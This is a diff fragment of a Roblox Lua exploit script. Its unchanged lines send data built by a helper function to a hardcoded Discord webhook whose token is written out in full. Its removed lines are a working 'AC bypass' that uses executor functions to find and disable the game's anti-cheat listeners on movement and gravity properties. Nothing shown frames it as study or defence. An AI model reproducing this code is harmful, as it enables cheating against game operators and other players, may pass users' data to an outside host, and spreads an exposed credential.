@@ -203,29 +203,3 @@ end
 local webhookUrl = "https://discord.com/api/webhooks/1304179425264406671/Q90zkldqFnjoHZ4Z60rejeVuy21arPZkO4JekishBhEq4r_zrv8-58pcmr5goH-StZEc"
 local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
-print("AC bypass")
-local LocalPlayer = game.Players.LocalPlayer
-local Humanoid = LocalPlayer.Character.Humanoid
-
-local Connections = {
-    {'CharacterController', Humanoid.GetPropertyChangedSignal(Humanoid, 'WalkSpeed')},
-    {'CharacterController', Humanoid.GetPropertyChangedSignal(Humanoid, 'JumpHeight')},
-    {'CharacterController', Humanoid.GetPropertyChangedSignal(Humanoid, 'HipHeight')},
-    {'CharacterController', Workspace.GetPropertyChangedSignal(Workspace, 'Gravity')},
-    {'CharacterController', Humanoid.StateChanged},
-    {'CharacterController', Humanoid.ChildAdded},
-    {'CharacterController', Humanoid.ChildRemoved},
-}
-
-for Index, Array in pairs(Connections) do
-    for _, Connection in pairs(getconnections(Array[2])) do
-        if type(Connection.Function) == 'function' then
-            local Info = debug.getinfo(Connection.Function)
-
-            if Info and string.find(Info.source, Array[1]) then
-                print(`disabling '{tostring(Connection.Function)}': {tostring(Array[2])}`)
-                Connection:Disable()
-            end
-        end
-    end
-end
